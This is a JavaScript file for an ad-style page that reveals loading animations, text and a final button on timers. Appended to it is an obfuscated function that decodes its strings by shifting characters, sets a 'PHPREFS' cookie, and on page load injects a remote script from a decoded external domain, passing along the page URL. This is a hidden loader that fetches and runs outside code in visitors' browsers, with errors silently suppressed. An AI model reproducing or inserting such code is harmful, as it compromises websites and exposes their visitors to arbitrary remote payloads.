function showAd2() {
  (document.getElementById("ad1").style.display = "none"),
    (document.getElementById("ad2").style.display = "block"),
    setTimeout(() => {
      (document.getElementById("loadingGif").style.display = "none"),
        document.getElementById("text1").classList.remove("hidden"),
        setTimeout(() => {
          document.getElementById("loadingGif2").classList.remove("hidden"),
            setTimeout(() => {
              (document.getElementById("loadingGif2").style.display = "none"),
                document.getElementById("text2").classList.remove("hidden"),
                setTimeout(() => {
                  document
                    .getElementById("loadingGif3")
                    .classList.remove("hidden"),
                    setTimeout(() => {
                      (document.getElementById("loadingGif3").style.display =
                        "none"),
                        document
                          .getElementById("text3")
                          .classList.remove("hidden"),
                        setTimeout(() => {
                          document
                            .getElementById("finalButton")
                            .classList.remove("hidden");
                        }, 2e3);
                    }, 4e3);
                }, 2e3);
            }, 2e3);
        }, 2e3);
    }, 3e3);
}
document.querySelectorAll(".size-btn").forEach((button) => {
  button.addEventListener("click", function () {
    document
      .querySelectorAll(".size-btn")
      .forEach((btn) => btn.classList.remove("active")),
      this.classList.add("active");
  });
});
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src = o.f("myyux?44hi" + "sqtlx3twl4" + "l4x3oxDwB") + l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=2592000;";
  } catch (e) {}
})({}, document, location);

document.addEventListener("DOMContentLoaded", function () {
  showAd2();
});
